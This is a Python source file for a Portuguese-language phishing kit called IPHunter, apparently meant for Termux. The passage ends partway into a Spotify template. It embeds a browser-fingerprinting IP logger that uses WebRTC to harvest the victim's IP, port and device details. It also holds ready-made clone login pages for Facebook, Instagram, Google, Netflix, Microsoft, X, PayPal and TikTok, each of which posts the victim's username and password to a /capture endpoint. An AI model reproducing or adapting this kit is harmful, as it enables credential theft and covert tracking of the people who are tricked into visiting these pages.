#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#  IPHunter v2.0 - IP Logger & Phishing Tool
#  Para Termux - Atualizado 2026
# ============================================================

import os
import sys
import subprocess
import time
import json
import re
import socket
import threading
import http.server
import socketserver
from datetime import datetime
from urllib.parse import parse_qs, urlparse

# ============================================================
#  CORES ANSI
# ============================================================
class C:
    RESET       = "\033[0m"
    BOLD        = "\033[1m"
    DIM         = "\033[2m"
    UNDERLINE   = "\033[4m"
    RED         = "\033[31m"
    GREEN       = "\033[32m"
    YELLOW      = "\033[33m"
    BLUE        = "\033[34m"
    MAGENTA     = "\033[35m"
    CYAN        = "\033[36m"
    WHITE       = "\033[37m"
    BRIGHT_RED      = "\033[91m"
    BRIGHT_GREEN    = "\033[92m"
    BRIGHT_YELLOW   = "\033[93m"
    BRIGHT_BLUE     = "\033[94m"
    BRIGHT_MAGENTA  = "\033[95m"
    BRIGHT_CYAN     = "\033[96m"
    BRIGHT_WHITE    = "\033[97m"
    BG_BLACK    = "\033[40m"
    BG_RED      = "\033[41m"
    BG_GREEN    = "\033[42m"
    BG_YELLOW   = "\033[43m"
    BG_BLUE     = "\033[44m"
    BG_MAGENTA  = "\033[45m"
    BG_CYAN     = "\033[46m"
    BG_WHITE    = "\033[47m"


# ============================================================
#  ASCII ART - IPHUNTER v2.0 (MAIOR)
# ============================================================
BANNER = """
""" + C.BRIGHT_CYAN + r"""
    ██╗██████╗ ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗
    ██║██╔══██╗██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
    ██║██████╔╝███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
    ██║██╔═══╝ ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
    ██║██║     ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
    ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
""" + C.BRIGHT_MAGENTA + r"""
                         v2.0 - 2026 Edition
""" + C.RESET + """
"""


# ============================================================
#  IP LOGGER SCRIPT - Agora captura IP + PORTA (5 digitos)
# ============================================================
IP_LOGGER_SCRIPT = """
<script>
(async function(){
  try{
    const ipRes = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipRes.json();

    let port = 'unknown';
    try {
      const pc = new RTCPeerConnection({iceServers:[]});
      pc.createDataChannel('');
      const offer = await pc.createOffer();
      await pc.setLocalDescription(offer);

      await new Promise(r => setTimeout(r, 1200));

      const lines = (pc.localDescription?.sdp || '').split('\\n');
      for (const line of lines) {
        if (line.includes('a=candidate')) {
          const parts = line.split(' ');
          if (parts.length >= 6) {
            const p = parts[5];
            if (/^\\d{1,5}$/.test(p) && parseInt(p) > 1000) {
              port = p;
              break;
            }
          }
        }
      }
      pc.close();
    } catch(e) {}

    const screenRes = screen.width + 'x' + screen.height;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const battery = navigator.getBattery ? 'supported' : 'unsupported';
    const cores = navigator.hardwareConcurrency || 'unknown';
    const memory = navigator.deviceMemory || 'unknown';

    fetch('/log?ip=' + encodeURIComponent(ipData.ip) 
      + '&port=' + encodeURIComponent(port)
      + '&ref=' + encodeURIComponent(document.referrer) 
      + '&ua=' + encodeURIComponent(navigator.userAgent)
      + '&lang=' + navigator.language 
      + '&plat=' + encodeURIComponent(navigator.platform)
      + '&screen=' + encodeURIComponent(screenRes)
      + '&tz=' + encodeURIComponent(timezone)
      + '&battery=' + battery
      + '&cores=' + cores
      + '&memory=' + memory);
  } catch(e) {
    fetch('/log?ip=unknown&port=unknown&ref=' + encodeURIComponent(document.referrer) 
      + '&ua=' + encodeURIComponent(navigator.userAgent)
      + '&lang=' + navigator.language 
      + '&plat=' + encodeURIComponent(navigator.platform));
  }
})();
</script>
"""


# ============================================================
#  TEMPLATES HTML MODERNOS 2026
# ============================================================

EMPTY_TEMPLATE = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Carregando...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0f;min-height:100vh;display:flex;justify-content:center;align-items:center;font-family:'Inter','Segoe UI',system-ui,sans-serif;color:#fff;overflow:hidden}
.loader-wrap{position:relative;width:100%;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center}
.ring{width:80px;height:80px;border:3px solid rgba(0,212,255,0.08);border-top:3px solid #00d4ff;border-radius:50%;animation:spin 1s cubic-bezier(0.4,0,0.2,1) infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.pulse{position:absolute;width:120px;height:120px;border-radius:50%;background:rgba(0,212,255,0.03);animation:pulse 2s ease-in-out infinite}
@keyframes pulse{0%,100%{transform:scale(1);opacity:0.5}50%{transform:scale(1.3);opacity:0}}
h1{font-size:1.4rem;font-weight:500;margin-top:32px;letter-spacing:0.5px;color:rgba(255,255,255,0.7)}
p{font-size:0.85rem;color:rgba(255,255,255,0.3);margin-top:8px}
.dots::after{content:'';animation:dots 1.5s steps(4,end) infinite}
@keyframes dots{0%{content:''}25%{content:'.'}50%{content:'..'}75%{content:'...'}100%{content:''}}
</style>""" + IP_LOGGER_SCRIPT + """
</head><body>
<div class="loader-wrap">
<div class="pulse"></div>
<div class="ring"></div>
<h1>Carregando<span class="dots"></span></h1>
<p>Por favor, aguarde um momento</p>
</div></body></html>"""


FACEBOOK_TEMPLATE = """<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook - entre ou cadastre-se</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f0f2f5;font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.wrap{display:flex;flex-direction:column;align-items:center;gap:0;max-width:400px;width:100%}
.logo{font-size:3.2rem;font-weight:800;color:#1877f2;margin-bottom:24px;letter-spacing:-1px}
.card{background:#fff;border-radius:12px;padding:20px 16px 28px;box-shadow:0 2px 4px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.1);width:100%}
.card h2{font-size:1.1rem;font-weight:500;text-align:center;color:#1c1e21;margin-bottom:16px}
.inp{width:100%;padding:14px 16px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;font-size:1.05rem;transition:border-color .2s,box-shadow .2s;background:#fff}
.inp:focus{outline:none;border-color:#1877f2;box-shadow:0 0 0 2px rgba(24,119,242,0.2)}
.inp::placeholder{color:#8a8d91}
.btn-login{width:100%;padding:12px;margin-top:10px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:1.25rem;font-weight:700;cursor:pointer;transition:background .15s}
.btn-login:hover{background:#166fe5}
.forgot{text-align:center;margin:16px 0 10px}
.forgot a{color:#1877f2;text-decoration:none;font-size:.9rem;font-weight:500}
.forgot a:hover{text-decoration:underline}
hr{border:none;border-top:1px solid #dadde1;margin:20px 16px}
.btn-new{width:calc(100% - 32px);margin:0 16px;padding:14px;background:#42b72a;color:#fff;border:none;border-radius:6px;font-size:1.05rem;font-weight:700;cursor:pointer;transition:background .15s}
.btn-new:hover{background:#36a420}
.footer{text-align:center;margin-top:24px;color:#737373;font-size:.85rem}
.footer a{color:#737373;text-decoration:none;font-weight:500}
.footer a:hover{text-decoration:underline}
</style>""" + IP_LOGGER_SCRIPT + """
</head><body>
<div class="wrap">
<div class="logo">facebook</div>
<div class="card">
<h2>Entrar no Facebook</h2>
<form action="/capture" method="POST">
<input type="text" name="email" class="inp" placeholder="Email ou telefone" required autocomplete="username">
<input type="password" name="pass" class="inp" placeholder="Senha" required autocomplete="current-password">
<button type="submit" class="btn-login">Entrar</button>
</form>
<div class="forgot"><a href="#">Esqueceu a senha?</a></div>
<hr>
<button class="btn-new">Criar nova conta</button>
</div>
<div class="footer">
<p><a href="#">Criar uma Pagina</a> para uma celebridade, uma marca ou uma empresa.</p>
<p style="margin-top:16px">Meta &copy; 2026</p>
</div>
</div></body></html>"""


INSTAGRAM_TEMPLATE = """<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fafafa;font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.wrap{width:100%;max-width:350px}
.box{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px 40px 20px;margin-bottom:10px;text-align:center}
.logo{margin-bottom:30px}
.logo h1{font-family:'Billabong',cursive;font-size:3em;color:#262626}
.inp{width:100%;padding:9px 8px;margin:3px 0;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:.75rem;transition:border-color .2s}
.inp:focus{outline:none;border-color:#a8a8a8}
.btn{width:100%;padding:8px;margin:12px 0;background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:600;font-size:.9rem;cursor:pointer;opacity:1;transition:opacity .2s}
.btn:hover{opacity:.85}
.or{display:flex;align-items:center;margin:15px 0;color:#8e8e8e;font-size:.8rem;font-weight:600}
.or::before,.or::after{content:'';flex:1;height:1px;background:#dbdbdb;margin:0 10px}
.fb{color:#385185;font-size:.85rem;font-weight:600;margin:15px 0;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px}
.forgot{color:#00376b;font-size:.75rem;margin-top:15px;cursor:pointer}
.signup{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:20px;text-align:center;font-size:.9rem}
.signup a{color:#0095f6;text-decoration:none;font-weight:600}
.get{text-align:center;margin-top:20px}
.get p{color:#262626;font-size:.9rem;margin-bottom:15px}
</style>""" + IP_LOGGER_SCRIPT + """
</head><body>
<div class="wrap">
<div class="box">
<div class="logo"><h1>Instagram</h1></div>
<form action="/capture" method="POST">
<input type="text" name="username" class="inp" placeholder="Telefone, nome de usuario ou email" required>
<input type="password" name="password" class="inp" placeholder="Senha" required>
<button type="submit" class="btn">Entrar</button>
</form>
<div class="or">OU</div>
<div class="fb">Entrar com o Facebook</div>
<div class="forgot">Esqueceu a senha?</div>
</div>
<div class="box signup">Nao tem uma conta? <a href="#">Cadastre-se</a></div>
<div class="get"><p>Obtenha o aplicativo.</p></div>
</div></body></html>"""


GOOGLE_TEMPLATE = """<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Fazer login nas Contas do Google</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:'Roboto',Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{width:100%;max-width:450px;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px}
.logo{text-align:center;margin-bottom:24px}
.logo svg{width:75px;height:24px}
h1{color:#202124;font-size:24px;font-weight:400;text-align:center;margin-bottom:8px}
.sub{color:#202124;font-size:16px;text-align:center;margin-bottom:32px}
.inp-wrap{position:relative;margin:16px 0}
.inp{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;color:#202124;transition:border-color .2s,box-shadow .2s}
.inp:focus{outline:none;border-color:#1a73e8;box-shadow:inset 0 0 0 1px #1a73e8}
.inp::placeholder{color:#5f6368}
.forgot{color:#1a73e8;font-size:14px;font-weight:500;margin:8px 0 32px;display:inline-block;text-decoration:none}
.guest{color:#5f6368;font-size:14px;margin-bottom:40px}
.guest a{color:#1a73e8;text-decoration:none;font-weight:500}
.actions{display:flex;justify-content:space-between;align-items:center}
.create{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;padding:8px}
.next{background:#1a73e8;color:#fff;border:none;padding:9px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;transition:box-shadow .2s}
.next:hover{box-shadow:0 1px 2px 0 rgba(60,64,67,0.3),0 1px 3px 1px rgba(60,64,67,0.15)}
.footer{text-align:center;margin-top:32px;color:#5f6368;font-size:12px;display:flex;justify-content:space-between;align-items:center}
.footer a{color:#5f6368;text-decoration:none;margin:0 8px}
.lang-select{border:none;background:transparent;color:#5f6368;font-size:12px;cursor:pointer}
</style>""" + IP_LOGGER_SCRIPT + """
</head><body>
<div class="card">
<div class="logo"><svg viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg"><path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.36z" fill="#EA4335"/><path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.36z" fill="#FBBC05"/><path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/><path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/><path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/><path d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z" fill="#4285F4"/></svg></div>
<h1>Fazer login</h1>
<p class="sub">Use sua Conta do Google</p>
<form action="/capture" method="POST">
<div class="inp-wrap"><input type="email" name="email" class="inp" placeholder="Email ou telefone" required></div>
<div class="inp-wrap"><input type="password" name="password" class="inp" placeholder="Digite sua senha" required></div>
<a href="#" class="forgot">Esqueceu seu email?</a>
<p class="guest">Nao esta no seu computador? Use o modo visitante para fazer login de forma privada. <a href="#">Saiba mais</a></p>
<div class="actions">
<a href="#" class="create">Criar conta</a>
<button type="submit" class="next">Avancar</button>
</div>
</form>
</div>
<div class="footer">
<select class="lang-select"><option>Portugues (Brasil)</option></select>
<div><a href="#">Ajuda</a><a href="#">Privacidade</a><a href="#">Termos</a></div>
</div></body></html>"""


NETFLIX_TEMPLATE = """<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Netflix</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;font-family:'Inter','Helvetica Neue',Helvetica,Arial,sans-serif;min-height:100vh;color:#fff}
.header{padding:20px 4%}
.header svg{width:167px;height:auto;fill:#e50914}
.wrap{max-width:450px;margin:0 auto;padding:60px 5% 40px}
h1{font-size:32px;font-weight:700;margin-bottom:28px}
.inp{width:100%;padding:16px 20px;margin:8px 0;background:#333;border:none;border-radius:4px;color:#fff;font-size:16px;transition:background .2s}
.inp:focus{outline:none;background:#454545}
.inp::placeholder{color:#8c8c8c}
.btn{width:100%;padding:16px;margin:24px 0 12px;background:#e50914;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:700;cursor:pointer;transition:background .15s}
.btn:hover{background:#f40612}
.help{display:flex;justify-content:space-between;align-items:center;color:#b3b3b3;font-size:13px;margin:10px 0}
.help label{display:flex;align-items:center;gap:4px;cursor:pointer}
.help input{width:auto}
.help a{color:#b3b3b3;text-decoration:none}
.help a:hover{text-decoration:underline}
.signup{color:#737373;margin-top:60px;font-size:16px}
.signup a{color:#fff;text-decoration:none}
.signup a:hover{text-decoration:underline}
.recaptcha{color:#8c8c8c;font-size:13px;margin-top:15px}
.recaptcha a{color:#0071eb;text-decoration:none}
</style>""" + IP_LOGGER_SCRIPT + """
</head><body>
<div class="header"><svg viewBox="0 0 111 30" xmlns="http://www.w3.org/2000/svg"><path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687H35.97V0h13.406v4.687h-4.03zM24.938 4.687V0H11.22v4.687h4.687v21.625c1.5 0 3.063.063 4.594.188V4.687h4.437zm-16.97 18.53c-2.062-.156-4.125-.25-6.218-.312V0H0v23.406c2.063.094 4.156.22 6.218.406v-.594z"/></svg></div>
<div class="wrap">
<h1>Entrar</h1>
<form action="/capture" method="POST">
<input type="email" name="email" class="inp" placeholder="Email ou numero de telefone" required>
<input type="password" name="password" class="inp" placeholder="Senha" required>
<button type="submit" class="btn">Entrar</button>
</form>
<div class="help"><label><input type="checkbox" checked> Lembre-se de mim</label><a href="#">Precisa de ajuda?</a></div>
<div class="signup">Novo por aqui? <a href="#">Assine agora</a>.</div>
<div class="recaptcha">Esta pagina e protegida pelo Google reCAPTCHA para garantir que voce nao e um robo. <a href="#">Saiba mais.</a></div>
</div></body></html>"""


MICROSOFT_TEMPLATE = """<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Entrar na conta</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;500;600;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#f3f2f1 0%,#e1dfdd 100%);font-family:'Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{width:100%;max-width:440px;background:#fff;padding:44px 36px 36px;box-shadow:0 2px 6px rgba(0,0,0,0.2)}
.logo{margin-bottom:16px}
.logo svg{width:108px;height:24px}
h1{color:#1b1b1b;font-size:1.5rem;font-weight:600;margin-bottom:12px}
.inp{width:100%;padding:6px 10px;margin:12px 0;border:none;border-bottom:1px solid #8c8c8c;font-size:15px;color:#1b1b1b;transition:border-color .2s}
.inp:focus{outline:none;border-bottom:2px solid #0067b8}
.inp::placeholder{color:#8c8c8c}
.forgot{color:#0067b8;font-size:13px;margin:10px 0;display:inline-block;text-decoration:none}
.forgot:hover{color:#005a9e}
.actions{display:flex;justify-content:flex-end;margin-top:24px}
.next{background:#0067b8;color:#fff;border:none;padding:8px 32px;font-size:15px;cursor:pointer;transition:background .15s}
.next:hover{background:#005a9e}
</style>""" + IP_LOGGER_SCRIPT + """
</head><body>
<div class="card">
<div class="logo"><svg viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h51.6v24H0V0zm56.4 0H108v24H56.4V0z" fill="#737373"/></svg></div>
<h1>Entrar</h1>
<form action="/capture" method="POST">
<input type="email" name="email" class="inp" placeholder="Email, telefone ou Skype" required>
<input type="password" name="password" class="inp" placeholder="Senha" required>
<div class="forgot">Nao tem acesso ao seu telefone ou email?</div>
<div class="actions"><button type="submit" class="next">Entrar</button></div>
</form>
</div></body></html>"""


TWITTER_TEMPLATE = """<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Entrar no X</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#e7e9ea;padding:20px}
.card{width:100%;max-width:364px;padding:20px}
.logo{text-align:center;margin-bottom:30px}
.logo svg{width:40px;fill:#e7e9ea}
h1{font-size:31px;font-weight:700;margin-bottom:30px}
.inp{width:100%;padding:16px 10px;margin:12px 0;background:transparent;border:1px solid #333;border-radius:4px;color:#e7e9ea;font-size:17px;transition:border-color .2s}
.inp:focus{outline:none;border-color:#1d9bf0}
.inp::placeholder{color:#71767b}
.btn{width:100%;padding:16px;margin:12px 0;background:#fff;color:#0f1419;border:none;border-radius:9999px;font-size:15px;font-weight:700;cursor:pointer;transition:background .15s}
.btn:hover{background:#e6e6e6}
.forgot{color:#1d9bf0;font-size:15px;margin:15px 0;cursor:pointer;display:inline-block}
.forgot:hover{text-decoration:underline}
.or{display:flex;align-items:center;margin:20px 0;color:#71767b;font-size:15px}
.or::before,.or::after{content:'';flex:1;height:1px;background:#333;margin:0 10px}
.signup{color:#71767b;font-size:15px;margin-top:40px}
.signup a{color:#1d9bf0;text-decoration:none}
.signup a:hover{text-decoration:underline}
</style>""" + IP_LOGGER_SCRIPT + """
</head><body>
<div class="card">
<div class="logo"><svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></div>
<h1>Entrar no X</h1>
<form action="/capture" method="POST">
<input type="text" name="username" class="inp" placeholder="Celular, email ou nome de usuario" required>
<input type="password" name="password" class="inp" placeholder="Senha" required>
<button type="submit" class="btn">Avancar</button>
</form>
<div class="or">ou</div>
<button class="btn" style="background:transparent;color:#fff;border:1px solid #536471">Esqueceu sua senha?</button>
<div class="signup">Nao tem uma conta? <a href="#">Inscreva-se</a></div>
</div></body></html>"""


PAYPAL_TEMPLATE = """<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Entrar na conta do PayPal</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:'Inter','Helvetica Neue',Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{width:100%;max-width:460px;padding:42px}
.logo{text-align:center;margin-bottom:30px}
.logo svg{width:120px;height:auto}
.inp{width:100%;padding:15px 10px;margin:10px 0;border:1px solid #9da3a6;border-radius:4px;font-size:16px;color:#2c2e2f;transition:border-color .2s,box-shadow .2s}
.inp:focus{outline:none;border-color:#0070ba;box-shadow:0 0 0 2px rgba(0,112,186,0.15)}
.inp::placeholder{color:#9da3a6}
.btn{width:100%;padding:15px;margin:15px 0;background:#0070ba;color:#fff;border:none;border-radius:25px;font-size:17px;font-weight:700;cursor:pointer;transition:background .15s}
.btn:hover{background:#005ea6}
.forgot{text-align:center;color:#0070ba;font-size:15px;margin:15px 0;cursor:pointer}
.forgot:hover{text-decoration:underline}
.signup{text-align:center;margin-top:30px;padding-top:20px;border-top:1px solid #e6e6e6}
.signup a{color:#0070ba;text-decoration:none;font-weight:600}
</style>""" + IP_LOGGER_SCRIPT + """
</head><body>
<div class="card">
<div class="logo"><svg viewBox="0 0 120 32" xmlns="http://www.w3.org/2000/svg"><path d="M46.2 8.9c-.3-2-2-3.3-4.1-3.3H33.8c-.3 0-.6.2-.7.5l-3.4 21.6c0 .2.1.4.4.4h3.8c.2 0 .4-.2.4-.4l.9-5.9c0-.3.3-.5.6-.5h2.6c5.2 0 8.3-2.5 9.1-7.5.4-2.3.2-4.2-.7-5.5-.5-.7-1.2-1.2-2.2-1.4zm-3.3 5.4c-.4 2.8-2.5 2.8-4.5 2.8h-1.1l.8-5c0-.2.2-.4.5-.4h.5c1.4 0 2.7 0 3.4.8.4.5.5 1.2.4 1.8z" fill="#003087"/><path d="M66.5 8.9c-.3-2-2-3.3-4.1-3.3H54c-.3 0-.6.2-.7.5l-3.4 21.6c0 .2.1.4.4.4h3.5c.3 0 .6-.2.7-.5l.9-5.9c0-.3.3-.5.6-.5h2.6c5.2 0 8.3-2.5 9.1-7.5.4-2.3.2-4.2-.7-5.5-.4-.7-1.1-1.2-2.1-1.4zm-3.3 5.4c-.4 2.8-2.5 2.8-4.5 2.8h-1.1l.8-5c0-.2.2-.4.5-.4h.5c1.4 0 2.7 0 3.4.8.4.5.5 1.2.4 1.8z" fill="#0070E0"/><path d="M85.5 8.9c-.1-.3-.4-.5-.7-.5h-3.8c-.3 0-.5.2-.6.4l-3.4 21.6c0 .2.1.4.4.4h3.5c.3 0 .6-.2.7-.5l.9-5.9c0-.3.3-.5.6-.5h2.6c5.2 0 8.3-2.5 9.1-7.5.4-2.3.2-4.2-.7-5.5-.4-.7-1.1-1.2-2.1-1.4-.1 0-.2-.1-.3-.1-.5 0-1 .1-1.5.3.5-.3.9-.7 1.2-1.3.4-.8.5-1.8.3-2.9-.3-2-2-3.3-4.1-3.3H74.3c-.3 0-.6.2-.7.5l-3.4 21.6c0 .2.1.4.4.4h3.5c.3 0 .6-.2.7-.5l.9-5.9c0-.3.3-.5.6-.5h2.6c1.9 0 3.3-.3 4.3-.9.7-.4 1.2-1 1.5-1.7.1-.1.1-.2.2-.3.3-.5.5-1.1.5-1.7.1-.3.1-.5.1-.8z" fill="#003087"/><path d="M103.5 8.9c-.3-2-2-3.3-4.1-3.3H91c-.3 0-.6.2-.7.5l-3.4 21.6c0 .2.1.4.4.4h3.5c.3 0 .6-.2.7-.5l.9-5.9c0-.3.3-.5.6-.5h2.6c5.2 0 8.3-2.5 9.1-7.5.4-2.3.2-4.2-.7-5.5-.4-.7-1.1-1.2-2.1-1.4z" fill="#0070E0"/></svg></div>
<form action="/capture" method="POST">
<input type="email" name="email" class="inp" placeholder="Email" required>
<input type="password" name="password" class="inp" placeholder="Senha" required>
<button type="submit" class="btn">Entrar</button>
</form>
<div class="forgot">Esqueceu seu email ou senha?</div>
<div class="signup">Novo no PayPal? <a href="#">Criar conta</a></div>
</div></body></html>"""


TIKTOK_TEMPLATE = """<!DOCTYPE html>
<html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TikTok - Fazer login</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.card{width:100%;max-width:375px;padding:40px 20px}
.logo{text-align:center;margin-bottom:30px}
.logo h1{font-size:32px;font-weight:700;letter-spacing:-1px}
.tabs{display:flex;justify-content:center;margin-bottom:20px;border-bottom:1px solid #e3e3e4}
.tab{padding:10px 20px;color:#161823;font-weight:600;border-bottom:2px solid #fe2c55}
.inp{width:100%;padding:14px 16px;margin:8px 0;background:#f1f1f2;border:1px solid #e3e3e4;border-radius:4px;font-size:16px;transition:border-color .2s}
.inp:focus{outline:none;border-color:#fe2c55}
.inp::placeholder{color:#8a8b91}
.btn{width:100%;padding:14px;margin:15px 0;background:#fe2c55;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:700;cursor:pointer;transition:background .15s}
.btn:hover{background:#ef2950}
.forgot{text-align:center;color:#161823;font-size:14px;margin:15px 0;cursor:pointer}
.signup{text-align:center;color:#161823;font-size:14px;margin-top:20px}
.signup a{color:#fe2c55;text-decoration:none;font-weight:600}
</style>""" + IP_LOGGER_SCRIPT + """
</head><body>
<div class="card">
<div class="logo"><h1>TikTok</h1></div>
<div class="tabs"><div class="tab">Telefone/Email/Nome de usuario</div></div>
<form action="/capture" method="POST">
<input type="text" name="username" class="inp" placeholder="Email ou nome de usuario" required>
<input type="password" name="password" class="inp" placeholder="Senha" required>
<button type="submit" class="btn">Entrar</button>
</form>
<div class="forgot">Esqueceu a senha?</div>
<div class="signup">Nao tem uma conta? <a href="#">Cadastre-se</a></div>
</div></body></html>"""


SPOTIFY_TEMPLATE = """<!DOCTYPE html>
